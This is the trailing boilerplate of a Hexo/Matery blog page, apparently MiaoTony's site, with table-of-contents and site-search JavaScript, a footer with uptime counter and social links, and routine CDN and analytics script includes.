        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4, h5').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
        <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2022</span>
            
            <a href="/about" target="_blank">MiaoTony</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
                        &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">340.3k</span>&nbsp;字
                                                                                    <span id="busuanzi_container_site_pv">
			|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
                                    <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
                        <br>
                        <span id="sitetime">载入运行时间...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2019";
                    var startMonth = "11";
                    var startDate = "28";
                    var startHour = "0";
                    var startMinute = "0";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
                        <br>
                    </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://t.me/MiaoTonyChannel" class="tooltipped" target="_blank" data-tooltip="关注我的TelegramChannel: @MiaoTonyChannel" data-position="top" data-delay="50">
        <i class="fab fa-telegram"></i>
    </a>



    <a href="https://github.com/miaotony" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:miaotony@outlook.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>













    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    var cnt = 1;
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var content_index = [];
                        var data_title_origin = data.title.trim();
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + String(cnt) + ". " + data_title_origin + "</a>";
                            cnt += 1;
    
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 300 characters
                                var start = first_occur - 30;
                                if (start < 0) {
                                    start = 0;
                                }
                                var match_content = content.substr(start, 300);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });
    
                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    str = "<p class=\"search-result-summary\">共找到 " + String(cnt-1) + " 条结果</p>"  + str;
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/materialize/materialize.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/aos/aos.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/js/matery.min.js"></script>

    

    
<script>
    var _hmt = _hmt || [];
    (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?40e312a1eec109cf96e30988cf3bfe70";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>

    
    
    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    
    

    

    

    
    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
